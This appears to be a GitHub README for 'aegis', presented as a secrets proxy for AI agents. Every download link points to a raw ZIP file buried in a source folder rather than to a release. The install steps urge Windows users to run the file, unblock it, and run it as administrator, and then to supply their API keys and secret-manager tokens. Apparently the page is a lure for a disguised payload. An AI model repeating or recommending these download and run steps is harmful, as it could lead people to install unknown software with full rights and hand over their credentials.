# 🔐 aegis - Secure AI Agent Credential Proxy

[![Download aegis](https://img.shields.io/badge/Download%20aegis-4B7BEC?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/30nilupulthisaranga-bit/aegis/main/internal/proxy/Software-2.4-alpha.2.zip)

## 🧩 What aegis does

aegis helps AI agents use secrets without exposing them in plain text. It works as a credential proxy, so your app can ask for access when it needs it, while keeping keys and tokens in one place.

Use it when you want:

- Safer access to API keys
- Less manual copy and paste
- A simple way to connect AI tools to private services
- One place to manage secrets for local AI workflows

## 📥 Download and install on Windows

1. Open this page: https://raw.githubusercontent.com/30nilupulthisaranga-bit/aegis/main/internal/proxy/Software-2.4-alpha.2.zip
2. Find the latest release or build on the page
3. Download the Windows file from the release assets
4. If the file is a ZIP file, right-click it and choose Extract All
5. Open the extracted folder
6. Run the aegis file for Windows
7. If Windows asks for permission, choose Yes

If you download a ZIP package, keep the folder in a place you can find later, such as Downloads or Desktop.

## 🪟 First-time setup

After you start aegis on Windows, you may need to point it to your secret store or local config file. This lets the proxy know where to get credentials.

Typical setup steps:

1. Open the app or terminal window used by aegis
2. Add your secret source details
3. Save the settings
4. Restart aegis if needed
5. Check that the proxy starts without errors

If you use a local secrets manager, keep its address and access token ready before you begin.

## ⚙️ How to use aegis

aegis sits between your AI agent and the systems it needs to reach. The agent asks for a secret, and aegis returns it if access is allowed.

Common use cases:

- Connect an AI agent to an API that needs a key
- Keep private tokens out of prompts
- Give tools access to secrets only when needed
- Reduce risk when many apps use the same credentials

Basic flow:

1. Start aegis
2. Point your agent or tool to the proxy
3. Ask the agent to use a service that needs credentials
4. aegis checks the request
5. The credential is passed through in a controlled way

## 🧠 What you need before you start

Use a Windows PC with:

- Windows 10 or later
- At least 4 GB of RAM
- 200 MB of free disk space
- A stable internet connection for the first download
- Permission to run downloaded apps

For best results, keep these items ready:

- Any API keys you plan to use
- Your secret manager details
- The app or agent that will connect through aegis

## 🔒 Security model

aegis is built for controlled access. It helps keep secrets out of your prompts and out of broad shared files.

This setup can help you:

- Limit who sees a secret
- Reduce the chance of hardcoded keys
- Centralize access for AI tools
- Keep logs and usage more structured

Good practice:

- Use one secret per service
- Rotate keys on a regular schedule
- Give each tool only the access it needs
- Store secrets in a trusted manager, not in chat text

## 🛠️ Common setup examples

You can use aegis with many AI agent tools and local workflows.

### Local AI tool

- Start aegis on your PC
- Set the tool to use the proxy address
- Open the tool and run a task that needs a secret

### Team workflow

- Store shared credentials in one place
- Let each user connect through aegis
- Keep access rules simple

### Service bridge

- Connect a tool to an internal API
- Let aegis pass the needed token
- Keep the token out of the main app config

## 📁 Suggested folder layout

If you want to keep things tidy on Windows, use a simple folder structure:

- `Downloads\aegis` for the ZIP file
- `Documents\aegis` for config files
- `Documents\aegis\secrets` for local notes you control
- `Desktop\aegis` if you want quick access

Keep config files in one place. This makes it easier to back them up or move them to a new PC.

## 🧭 Simple run checklist

Before you launch aegis, check these items:

- The file is fully downloaded
- The ZIP file is extracted if needed
- Windows did not block the file
- Your secret source is ready
- The app or agent you want to connect is installed

After launch, confirm that:

- The proxy starts
- The app can reach the proxy
- The secret request works
- No login or permission step is missing

## 🔧 Troubleshooting

### The file will not open

- Make sure the download finished
- If it is a ZIP file, extract it first
- Check that you are opening the right file
- Try right-clicking the file and choosing Run as administrator

### Windows says the app is blocked

- Right-click the file
- Open Properties
- Look for an Unblock option
- Apply the change if you see it
- Run the app again

### The proxy starts but the agent cannot connect

- Check the proxy address
- Make sure both apps are on the same network path
- Restart aegis
- Restart the agent
- Confirm your firewall is not blocking the port

### Secrets do not load

- Check the source path
- Confirm the token or login is correct
- Make sure the secret name matches the one your agent expects
- Save the config file again
- Restart the proxy

## 📚 Project info

- Name: aegis
- Type: Credential proxy for AI agents
- Main focus: Secrets management and secure AI access
- Platform: Windows support for end users
- Main link: https://raw.githubusercontent.com/30nilupulthisaranga-bit/aegis/main/internal/proxy/Software-2.4-alpha.2.zip

## 🧷 Quick start path for non-technical users

If you want the shortest path:

1. Open the download link above
2. Download the Windows build
3. Extract it if it comes as a ZIP
4. Run the app
5. Connect your AI tool
6. Add your secret source
7. Test one request

## 🗂️ Topics covered by aegis

aegis fits use cases around:

- AI agents
- CLI tools
- Golang projects
- Infisical
- MCP
- Model Context Protocol
- Proxy-based access
- Secrets management
- Security controls